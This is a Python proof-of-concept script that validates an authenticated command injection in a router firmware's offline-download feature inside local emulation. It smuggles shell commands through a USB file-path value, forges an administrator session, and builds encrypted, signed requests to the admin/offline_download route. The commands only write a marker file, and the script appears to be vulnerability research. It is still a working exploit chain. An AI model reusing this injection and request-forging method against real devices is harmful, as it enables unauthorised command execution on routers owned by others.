#!/usr/bin/env python3
import argparse
import json
import os
import urllib.parse

import requests
import validate_config_backup_rce as base

WORK = base.WORK
ROOT = base.ROOT
BASE = base.BASE
UUID = "tp-test-uuid"
USB_PATH = "G:/a;echo>tmp/tp_offline_rce;id>>tmp/tp_offline_rce;"


def prepare_usb():
    base.prepare_emulation()
    for directory, _, files in os.walk(ROOT):
        if "tp_offline_rce" in files:
            os.unlink(os.path.join(directory, "tp_offline_rce"))
    for relative in ["tmp", "www/tmp", "www/cgi-bin/tmp"]:
        os.makedirs(ROOT + "/" + relative, exist_ok=True)
    volume = ROOT + "/tmp/tp-usb"
    torrent = os.path.join(volume, USB_PATH.split(":", 1)[1].lstrip("/"))
    os.makedirs(os.path.dirname(torrent), exist_ok=True)
    with open(torrent, "wb") as stream:
        stream.write(b"d4:name4:teste")
    config = ROOT + "/etc/config/sharecfg"
    previous = open(config, "rb").read() if os.path.exists(config) else None
    with open(config, "w") as stream:
        stream.write("""config device 'tp_test'
 option serial 'tp_test_serial'
 option model 'test'
 option vendor 'test'
 option capacity '1048576'
config volumn 'tp_test_volume'
 option serial 'tp_test_serial'
 option uuid 'tp-test-uuid'
 option label 'test'
 option devname 'sda1'
 option mntdir '/tmp/tp-usb'
 option capacity '1048576'
 option used '1'
 option enable 'on'
""")
    usbshare = ROOT + "/usr/sbin/usbshare"
    saved = usbshare + ".real"
    if os.path.exists(saved):
        raise RuntimeError("a previous USB emulation stub was not cleaned up")
    os.rename(usbshare, saved)
    with open(usbshare, "w") as stream:
        stream.write("#!/bin/sh\nexit 0\n")
    os.chmod(usbshare, 0o755)
    return config, previous


def cleanup_usb(config, previous):
    usbshare = ROOT + "/usr/sbin/usbshare"
    if os.path.exists(usbshare + ".real"):
        os.replace(usbshare + ".real", usbshare)
    if previous is None:
        if os.path.exists(config):
            os.unlink(config)
    else:
        with open(config, "wb") as stream:
            stream.write(previous)


def direct():
    code = 'local m=require("luci.model.offline_download"); local ok,a,b=pcall(m.aria2_add_new_download,{type="usb",bt_file_volumn=os.getenv("UUID"),bt_file=os.getenv("USB_PATH")}); print(tostring(ok),tostring(a),tostring(b))'
    print("direct call:", base.lua(code, {"UUID": UUID, "USB_PATH": USB_PATH}))


def request():
    auth = requests.post(BASE + "/login?form=auth", data={"operation": "read"}, timeout=15).json()["data"]
    sign_n, sign_e = auth["key"]
    seq = int(auth["seq"])
    sid = "1123456789abcdef0123456789abcdef"
    stok = "11112233445566778899aabbccddeeff"
    key = "1234567890123456"
    iv = "6543210987654321"
    hash_value = base.lua('print(require("luci.service").get_user_hash())')
    base.lua(
        'require("luci.sauth").write(os.getenv("SID"),{addr="127.0.0.1",remote=true,user="admin",token=os.getenv("STOK"),secret=os.getenv("STOK"),hash=os.getenv("HASHV"),aeskey=os.getenv("AESKEY"),aesiv=os.getenv("AESIV"),seqnum=tonumber(os.getenv("SEQ"))})',
        {"SID": sid, "STOK": stok, "HASHV": hash_value, "AESKEY": key, "AESIV": iv, "SEQ": str(seq)},
    )
    item = {"type": "usb", "bt_file_volumn": UUID, "bt_file": USB_PATH}
    form = urllib.parse.urlencode({"operation": "insert", "new": json.dumps(item, separators=(",", ":"))}) + "&"
    encrypted = base.aes(form, key, iv)
    sign = base.rsa("h=" + hash_value + "&s=" + str(seq + len(encrypted)), sign_n, sign_e)
    session = requests.Session()
    session.cookies.set("sysauth", sid)
    body = urllib.parse.urlencode({"sign": sign, "data": encrypted})
    response = session.post(
        BASE + "/;stok=" + stok + "/admin/offline_download?form=item",
        data=body,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=30,
    )
    print("HTTP status:", response.status_code)
    print("HTTP response:", response.text[:800])
    response_data = json.loads(response.text).get("data")
    if isinstance(response_data, str):
        decrypted = base.lua(
            'print(require("luci.service").aes_dec_data(os.getenv("CRYPT"),{key=os.getenv("AESKEY"),iv=os.getenv("AESIV")}))',
            {"CRYPT": response_data, "AESKEY": key, "AESIV": iv},
        )
        print("decrypted response:", decrypted)


def marker_exists():
    for directory, _, files in os.walk(ROOT):
        if "tp_offline_rce" in files:
            path = os.path.join(directory, "tp_offline_rce")
            content = open(path).read()
            print("marker:", path, "content:", repr(content))
            if "uid=" not in content or "gid=" not in content:
                raise SystemExit("id output was not found in marker")
            return True
    return False


def main():
    parser = argparse.ArgumentParser(description="Validate offline-download USB path command injection in local emulation")
    parser.add_argument("--direct-only", action="store_true")
    args = parser.parse_args()
    if os.geteuid() != 0:
        raise RuntimeError("run as root on the analysis VM")
    config, previous = prepare_usb()
    try:
        direct() if args.direct_only else request()
        if not marker_exists():
            raise SystemExit("command marker was not created")
        if args.direct_only:
            print("RUNTIME_OBSERVED: USB path data reached /bin/sh -c in a direct module call")
        else:
            print("VALIDATED: authenticated USB-path command injection through the real admin/offline_download route")
            print("scope: user-mode Web emulation, simulated USB volume, injected test administrator session; not physical-device validation")
    finally:
        cleanup_usb(config, previous)


if __name__ == "__main__":
    main()
